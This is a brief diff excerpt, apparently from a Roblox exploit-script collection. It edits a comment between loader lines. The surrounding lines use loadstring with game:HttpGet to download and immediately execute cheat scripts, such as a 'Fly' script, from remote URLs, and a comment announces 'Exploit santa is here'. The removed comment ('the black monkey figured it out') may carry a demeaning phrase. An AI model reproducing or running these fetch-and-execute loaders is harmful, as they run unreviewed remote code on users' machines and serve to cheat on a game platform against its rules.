@@ -34,7 +34,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/BigBoyTimme/New.Loads
 loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Fly.txt"))()
 
 
-# the black monkey figured it out
+# maybe its someone else? hehe
 
 # Exploit santa is here :fire:
 
